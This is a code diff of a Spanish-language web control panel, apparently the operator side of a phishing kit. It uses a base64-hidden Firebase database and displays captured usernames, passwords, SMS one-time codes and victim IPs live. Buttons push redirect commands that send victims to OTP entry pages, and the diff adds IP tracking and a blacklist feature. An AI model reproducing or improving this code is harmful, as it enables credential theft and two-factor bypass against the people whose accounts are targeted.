@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Panel - MODO RECUPERACIÓN</title>
+    <title>Panel con Control de IPs</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -10,17 +10,25 @@
     <style>
         body { background-color: #0f172a; font-family: 'Inter', sans-serif; color: white; }
         .card-user { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; margin-bottom: 12px; }
-        .card-spam { background: #451a1a; border: 1px solid #ef4444; opacity: 0.8; }
+        .card-spam { background: #451a1a; border: 1px solid #ef4444; }
+        .ip-repetida { background: #78350f; border: 2px solid #f59e0b; } /* IP sospechosa */
+        .ip-bloqueada { background: #7f1d1d; border: 2px solid #dc2626; opacity: 0.7; } /* IP bloqueada */
         .btn { padding: 8px 16px; border-radius: 6px; font-size: 11px; cursor: pointer; border: none; margin: 2px; font-weight: bold; }
         .btn-blue { background: #3b82f6; color: white; }
         .btn-orange { background: #f97316; color: white; }
-        .btn-red { background: #ef4444; color: white; }
+        .btn-red { background: #dc2626; color: white; }
         .btn-green { background: #10b981; color: white; }
         .btn-purple { background: #8b5cf6; color: white; }
+        .btn-gray { background: #4b5563; color: white; }
+        .btn-amber { background: #f59e0b; color: black; }
         #login-overlay { position: fixed; inset: 0; background: #0f172a; z-index: 50; display: flex; align-items: center; justify-content: center; }
         #panel-content { display: none; }
         .led-blink { animation: blink 1.5s infinite; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .badge { padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: bold; }
+        .badge-red { background: #dc2626; color: white; }
+        .badge-amber { background: #f59e0b; color: black; }
+        .badge-green { background: #10b981; color: white; }
     </style>
 </head>
 <body class="p-4">
@@ -37,25 +45,26 @@
     </div>
 
     <div id="panel-content">
+        <!-- HEADER -->
         <div class="flex justify-between items-center mb-6 border-b border-slate-700 pb-4">
             <div>
                 <h1 class="text-3xl font-black text-white">PANEL <span class="text-blue-500">CLIENTES</span></h1>
-                <p class="text-slate-500 text-xs">Sistema de Registro + OTP</p>
+                <p class="text-slate-500 text-xs">Sistema de Registro + Control de IPs</p>
             </div>
             <div class="flex items-center gap-4">
                 <div class="flex items-center gap-2 bg-slate-800/50 px-4 py-2 rounded-full">
                     <span class="w-2 h-2 bg-emerald-500 rounded-full led-blink"></span>
                     <span class="text-xs font-bold text-emerald-400">LIVE</span>
                 </div>
-                <button onclick="mostrarSpam()" class="bg-red-600 hover:bg-red-500 px-4 py-2 rounded-lg text-sm">
-                    <i class="fa-solid fa-trash"></i> Papelera (<span id="spam-count">0</span>)
+                <button onclick="mostrarBlacklist()" class="bg-red-600 hover:bg-red-500 px-4 py-2 rounded-lg text-sm">
+                    <i class="fa-solid fa-ban"></i> IPs Bloqueadas (<span id="blocked-count">0</span>)
                 </button>
                 <button onclick="cerrarSesion()" class="text-slate-400 hover:text-white text-sm">SALIR</button>
             </div>
         </div>
 
         <!-- STATS -->
-        <div class="grid grid-cols-4 gap-4 mb-6">
+        <div class="grid grid-cols-5 gap-4 mb-6">
             <div class="bg-slate-800 p-4 rounded-xl">
                 <p class="text-xs text-slate-500">TOTAL</p>
                 <p id="stat-total" class="text-2xl font-bold text-white">0</p>
@@ -65,20 +74,33 @@
                 <p id="stat-online" class="text-2xl font-bold text-emerald-400">0</p>
             </div>
             <div class="bg-slate-800 p-4 rounded-xl">
-                <p class="text-xs text-slate-500">BLOQUEADOS</p>
-                <p id="stat-spam" class="text-2xl font-bold text-red-400">0</p>
+                <p class="text-xs text-slate-500">SPAM</p>
+                <p id="stat-spam" class="text-2xl font-bold text-rose-400">0</p>
             </div>
             <div class="bg-slate-800 p-4 rounded-xl">
-                <p class="text-xs text-slate-500">HOY</p>
-                <p id="stat-hoy" class="text-2xl font-bold text-blue-400">0</p>
+                <p class="text-xs text-slate-500">IPs ÚNICAS</p>
+                <p id="stat-ips" class="text-2xl font-bold text-blue-400">0</p>
+            </div>
+            <div class="bg-slate-800 p-4 rounded-xl">
+                <p class="text-xs text-slate-500">IPs BLOQUEADAS</p>
+                <p id="stat-blocked" class="text-2xl font-bold text-red-500">0</p>
             </div>
         </div>
 
         <!-- BOTONES DE VISTA -->
-        <div class="flex gap-2 mb-4">
-            <button onclick="vistaActual = 'validos'; renderizar();" class="btn btn-green">✓ Registros Válidos</button>
-            <button onclick="vistaActual = 'spam'; renderizar();" class="btn btn-red">🗑 Papelera</button>
-            <button onclick="vistaActual = 'todos'; renderizar();" class="btn btn-blue">Todos</button>
+        <div class="flex gap-2 mb-4 flex-wrap">
+            <button onclick="cambiarVista('validos')" class="btn btn-green">✓ Registros</button>
+            <button onclick="cambiarVista('spam')" class="btn btn-red">🗑 Papelera</button>
+            <button onclick="cambiarVista('ips')" class="btn btn-amber">📊 Ver IPs Repetidas</button>
+            <button onclick="cambiarVista('blacklist')" class="btn btn-red">🚫 IPs Bloqueadas</button>
+            <button onclick="cambiarVista('todos')" class="btn btn-blue">Todos</button>
+        </div>
+
+        <!-- ALERTA DE IPs SOSPECHOSAS -->
+        <div id="alerta-ips" class="hidden mb-4 bg-amber-900/50 border border-amber-500 p-4 rounded-xl">
+            <p class="text-amber-400 font-bold"><i class="fa-solid fa-triangle-exclamation"></i> 
+                IPs con múltiples intentos detectadas: <span id="ips-sospechosas"></span>
+            </p>
         </div>
 
         <div id="container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"></div>
@@ -88,12 +110,20 @@
         const DB_URL = atob("aHR0cHM6Ly9jb29wLTI5LW9jdHUtYnJlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS8=");
         let db;
         let vistaActual = 'validos';
-        let todosLosDatos = { validos: [], spam: [] };
+        let datos = { validos: [], spam: [], blacklist: {} };
+        let contadorIPs = {};
 
-        // ANTI-SPAM MUY PERMISIVO
+        // ANTI-SPAM + BLACKLIST
         function esSpam(id, data) {
             if (!data || !data.user || !data.pass) return true;
             if (id === 'test' || id === 'admin') return true;
+            
+            // Verificar si la IP está en blacklist
+            if (data.ip && datos.blacklist[data.ip]) {
+                console.log('IP bloqueada detectada:', data.ip);
+                return true;
+            }
+            
             return false;
         }
 
@@ -128,44 +158,96 @@
             if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
             db = firebase.database();
 
+            // Escuchar registros válidos
             db.ref('logins').on('value', (snap) => {
-                const datos = [];
+                const validos = [];
+                contadorIPs = {}; // Resetear contador
+                
                 snap.forEach((child) => {
-                    datos.push({ id: child.key, data: child.val(), esSpam: false });
+                    const data = child.val();
+                    const id = child.key;
+                    
+                    // Contar IPs
+                    if (data.ip && data.ip !== 'unknown') {
+                        contadorIPs[data.ip] = (contadorIPs[data.ip] || 0) + 1;
+                    }
+                    
+                    validos.push({ id, data, esSpam: false });
                 });
-                todosLosDatos.validos = datos;
+                
+                datos.validos = validos;
+                verificarIPsRepetidas();
                 renderizar();
             });
 
+            // Escuchar spam
             db.ref('spam').on('value', (snap) => {
-                const datos = [];
+                const spam = [];
                 snap.forEach((child) => {
-                    datos.push({ id: child.key, data: child.val(), esSpam: true });
+                    spam.push({ id: child.key, data: child.val(), esSpam: true });
                 });
-                todosLosDatos.spam = datos;
-                document.getElementById('spam-count').textContent = datos.length;
+                datos.spam = spam;
                 renderizar();
             });
+
+            // Escuchar blacklist
+            db.ref('blacklist').on('value', (snap) => {
+                datos.blacklist = snap.val() || {};
+                document.getElementById('blocked-count').textContent = Object.keys(datos.blacklist).length;
+                document.getElementById('stat-blocked').textContent = Object.keys(datos.blacklist).length;
+                renderizar();
+            });
+        }
+
+        function verificarIPsRepetidas() {
+            const sospechosas = [];
+            for (const [ip, count] of Object.entries(contadorIPs)) {
+                if (count >= 5) { // Alerta si tiene 5+ intentos
+                    sospechosas.push(`${ip} (${count})`);
+                }
+            }
+            
+            if (sospechosas.length > 0) {
+                document.getElementById('alerta-ips').classList.remove('hidden');
+                document.getElementById('ips-sospechosas').textContent = sospechosas.join(', ');
+            } else {
+                document.getElementById('alerta-ips').classList.add('hidden');
+            }
+        }
+
+        function cambiarVista(vista) {
+            vistaActual = vista;
+            renderizar();
+        }
+
+        function mostrarBlacklist() {
+            cambiarVista('blacklist');
         }
 
         function renderizar() {
             const container = document.getElementById('container');
             container.innerHTML = '';
-            
-            let aMostrar = [];
-            if (vistaActual === 'validos') aMostrar = todosLosDatos.validos;
-            else if (vistaActual === 'spam') aMostrar = todosLosDatos.spam;
-            else aMostrar = [...todosLosDatos.validos, ...todosLosDatos.spam];
 
-            // Stats
-            document.getElementById('stat-total').textContent = todosLosDatos.validos.length;
-            document.getElementById('stat-spam').textContent = todosLosDatos.spam.length;
-            document.getElementById('stat-online').textContent = todosLosDatos.validos.filter(d => d.data.online).length;
+            // Stats generales
+            document.getElementById('stat-total').textContent = datos.validos.length;
+            document.getElementById('stat-spam').textContent = datos.spam.length;
+            document.getElementById('stat-online').textContent = datos.validos.filter(d => d.data.online).length;
+            document.getElementById('stat-ips').textContent = Object.keys(contadorIPs).length;
+
+            if (vistaActual === 'ips') {
+                renderizarIPs();
+                return;
+            }
             
-            const hoy = new Date().toDateString();
-            document.getElementById('stat-hoy').textContent = todosLosDatos.validos.filter(d => 
-                d.data.timestamp && new Date(d.data.timestamp).toDateString() === hoy
-            ).length;
+            if (vistaActual === 'blacklist') {
+                renderizarBlacklist();
+                return;
+            }
+
+            let aMostrar = [];
+            if (vistaActual === 'validos') aMostrar = datos.validos;
+            else if (vistaActual === 'spam') aMostrar = datos.spam;
+            else aMostrar = [...datos.validos, ...datos.spam];
 
             if (aMostrar.length === 0) {
                 container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay registros</div>';
@@ -175,15 +257,24 @@
             aMostrar.forEach(({id, data, esSpam}) => {
                 const isOnline = data.online === true;
                 const tieneOTP = data.sms && data.sms !== '----' && data.sms !== '';
+                const vecesIP = contadorIPs[data.ip] || 1;
+                const ipBloqueada = data.ip && datos.blacklist[data.ip];
+                
+                // Determinar clase CSS según IP
+                let cardClass = 'card-user';
+                if (esSpam) cardClass = 'card-user card-spam';
+                else if (ipBloqueada) cardClass = 'card-user ip-bloqueada';
+                else if (vecesIP >= 5) cardClass = 'card-user ip-repetida';
                 
                 container.innerHTML += `
-                    <div class="${esSpam ? 'card-spam' : 'card-user'}">
+                    <div class="${cardClass}">
                         <div class="flex justify-between items-center mb-2">
                             <span class="text-xs text-slate-400">#${id.slice(-8)}</span>
-                            ${esSpam ? '<span class="text-red-400 text-xs font-bold">🗑 BLOQUEADO</span>' : 
-                              `<span class="${isOnline ? 'text-emerald-400' : 'text-slate-500'} text-xs font-bold">
-                                ${isOnline ? '● ONLINE' : '○ OFFLINE'}
-                               </span>`}
+                            <div class="flex gap-1">
+                                ${vecesIP > 1 ? `<span class="badge badge-amber">${vecesIP} veces</span>` : ''}
+                                ${ipBloqueada ? '<span class="badge badge-red">BLOQUEADA</span>' : ''}
+                                ${isOnline ? '<span class="badge badge-green">ONLINE</span>' : ''}
+                            </div>
                         </div>
                         
                         <div class="bg-slate-900 p-2 rounded mb-2">
@@ -198,14 +289,21 @@
                         
                         <div class="bg-slate-900 p-2 rounded mb-2 text-center border ${tieneOTP ? 'border-emerald-500' : 'border-slate-700'}">
                             <p class="text-xs ${tieneOTP ? 'text-emerald-400' : 'text-slate-500'} mb-1">
-                                ${tieneOTP ? '✓ CÓDIGO VERIFICADO' : 'ESPERANDO CÓDIGO'}
+                                ${tieneOTP ? '✓ CÓDIGO OK' : 'ESPERANDO'}
                             </p>
                             <p class="text-xl font-black ${tieneOTP ? 'text-emerald-400' : 'text-blue-400'} tracking-widest">${data.sms || '----'}</p>
                         </div>
                         
-                        <div class="bg-slate-900/50 p-2 rounded mb-2">
-                            <p class="text-xs text-slate-500">IP CLIENTE</p>
-                            <p class="text-amber-400 font-mono text-xs">${data.ip || 'N/A'}</p>
+                        <div class="bg-slate-900/50 p-2 rounded mb-2 flex justify-between items-center">
+                            <div>
+                                <p class="text-xs text-slate-500">IP CLIENTE</p>
+                                <p class="text-amber-400 font-mono text-xs">${data.ip || 'N/A'}</p>
+                            </div>
+                            ${data.ip ? `
+                                <button onclick="toggleBlockIP('${data.ip}')" class="btn ${ipBloqueada ? 'btn-green' : 'btn-red'}" style="padding: 4px 8px; font-size: 10px;">
+                                    ${ipBloqueada ? '✓ Desbloquear' : '🚫 Bloquear'}
+                                </button>
+                            ` : ''}
                         </div>
                         
                         <div class="flex justify-between text-xs text-slate-500 mb-2 px-1">
@@ -220,12 +318,8 @@
                             </div>
                         ` : `
                             <div class="grid grid-cols-2 gap-1">
-                                <button onclick="solicitarOTP('${id}')" class="btn btn-blue">
-                                    <i class="fa-solid fa-comment-sms"></i> Solicitar OTP
-                                </button>
-                                <button onclick="solicitarOTP2('${id}')" class="btn btn-purple">
-                                    <i class="fa-solid fa-sync"></i> Solicitar OTP 2
-                                </button>
+                                <button onclick="solicitarOTP('${id}')" class="btn btn-blue">Solicitar OTP</button>
+                                <button onclick="solicitarOTP2('${id}')" class="btn btn-purple">Solicitar OTP 2</button>
                                 <button onclick="rechazar('${id}')" class="btn btn-orange">Rechazar</button>
                                 <button onclick="eliminar('${id}')" class="btn btn-red">Borrar</button>
                             </div>
@@ -235,30 +329,121 @@
             });
         }
 
-        function mostrarSpam() {
-            vistaActual = 'spam';
-            renderizar();
+        function renderizarIPs() {
+            const container = document.getElementById('container');
+            const ipsOrdenadas = Object.entries(contadorIPs).sort((a, b) => b[1] - a[1]);
+            
+            if (ipsOrdenadas.length === 0) {
+                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay IPs registradas</div>';
+                return;
+            }
+
+            let html = '<div class="col-span-3 bg-slate-800 p-6 rounded-xl">';
+            html += '<h3 class="text-xl font-bold mb-4 text-amber-400">📊 Ranking de IPs por frecuencia</h3>';
+            html += '<table class="w-full text-left">';
+            html += '<tr class="text-slate-500 text-xs border-b border-slate-700"><th class="pb-2">IP</th><th class="pb-2">Intentos</th><th class="pb-2">Estado</th><th class="pb-2">Acción</th></tr>';
+            
+            ipsOrdenadas.forEach(([ip, count]) => {
+                const bloqueada = datos.blacklist[ip];
+                html += `
+                    <tr class="border-b border-slate-700/50 ${bloqueada ? 'bg-red-900/30' : count >= 5 ? 'bg-amber-900/30' : ''}">
+                        <td class="py-3 font-mono text-sm ${bloqueada ? 'text-red-400' : 'text-white'}">${ip}</td>
+                        <td class="py-3">
+                            <span class="badge ${count >= 10 ? 'badge-red' : count >= 5 ? 'badge-amber' : 'badge-green'}">${count}</span>
+                        </td>
+                        <td class="py-3 text-xs">${bloqueada ? '<span class="text-red-400">🚫 BLOQUEADA</span>' : '<span class="text-emerald-400">✓ Activa</span>'}</td>
+                        <td class="py-3">
+                            <button onclick="toggleBlockIP('${ip}')" class="btn ${bloqueada ? 'btn-green' : 'btn-red'}" style="padding: 4px 12px;">
+                                ${bloqueada ? 'Desbloquear' : 'Bloquear'}
+                            </button>
+                        </td>
+                    </tr>
+                `;
+            });
+            
+            html += '</table></div>';
+            container.innerHTML = html;
         }
 
-        // FUNCIONES OTP CORREGIDAS
+        function renderizarBlacklist() {
+            const container = document.getElementById('container');
+            const ipsBloqueadas = Object.entries(datos.blacklist);
+            
+            if (ipsBloqueadas.length === 0) {
+                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay IPs bloqueadas</div>';
+                return;
+            }
+
+            let html = '<div class="col-span-3 bg-red-900/20 border border-red-500 p-6 rounded-xl">';
+            html += '<h3 class="text-xl font-bold mb-4 text-red-400">🚫 IPs Bloqueadas Permanentemente</h3>';
+            html += '<table class="w-full text-left">';
+            html += '<tr class="text-red-300 text-xs border-b border-red-700"><th class="pb-2">IP</th><th class="pb-2">Bloqueado desde</th><th class="pb-2">Acción</th></tr>';
+            
+            ipsBloqueadas.forEach(([ip, info]) => {
+                html += `
+                    <tr class="border-b border-red-700/30">
+                        <td class="py-3 font-mono text-red-200">${ip}</td>
+                        <td class="py-3 text-sm text-red-300">${info.since ? new Date(info.since).toLocaleString() : 'Desconocido'}</td>
+                        <td class="py-3">
+                            <button onclick="toggleBlockIP('${ip}')" class="btn btn-green" style="padding: 4px 12px;">
+                                ✓ Desbloquear IP
+                            </button>
+                        </td>
+                    </tr>
+                `;
+            });
+            
+            html += '</table></div>';
+            container.innerHTML = html;
+        }
+
+        // FUNCIONES DE BLOQUEO
+        function toggleBlockIP(ip) {
+            if (!ip || ip === 'unknown') return;
+            
+            if (datos.blacklist[ip]) {
+                // Desbloquear
+                if (confirm(`¿Desbloquear la IP ${ip}?`)) {
+                    db.ref('blacklist/' + ip.replace(/\./g, '_')).remove();
+                }
+            } else {
+                // Bloquear
+                if (confirm(`¿Bloquear PERMANENTEMENTE la IP ${ip}?\n\nLos datos de esta IP se moverán a spam.`)) {
+                    const ipKey = ip.replace(/\./g, '_'); // Firebase no permite puntos en keys
+                    db.ref('blacklist/' + ipKey).set({
+                        ip: ip,
+                        since: Date.now(),
+                        reason: 'Manual block'
+                    });
+                    
+                    // Mover registros existentes de esta IP a spam
+                    datos.validos.forEach(({id, data}) => {
+                        if (data.ip === ip) {
+                            db.ref('spam/' + id).set({...data, blocked: true});
+                            db.ref('logins/' + id).remove();
+                        }
+                    });
+                }
+            }
+        }
+
+        // COMANDOS OTP
         function solicitarOTP(id) {
-            // Guarda comando para que el cliente redirija a otp.html
             db.ref('comandos/' + id).set({ 
                 action: 'redirect', 
                 url: 'otp.html',
                 ts: Date.now() 
             });
-            alert('✓ Comando enviado: Redirigir a otp.html');
+            alert('✓ Redirigiendo a otp.html');
         }
 
         function solicitarOTP2(id) {
-            // Guarda comando para que el cliente redirija a otp2.html
             db.ref('comandos/' + id).set({ 
                 action: 'redirect', 
                 url: 'otp2.html',
                 ts: Date.now() 
             });
-            alert('✓ Comando enviado: Redirigir a otp2.html');
+            alert('✓ Redirigiendo a otp2.html');
         }
 
         function rechazar(id) {
@@ -271,7 +456,7 @@
         }
 
         function recuperar(id) {
-            if (!confirm('¿Recuperar este registro?')) return;
+            if (!confirm('¿Recuperar?')) return;
             db.ref('spam/' + id).once('value').then((snap) => {
                 const data = snap.val();
                 if (data) {
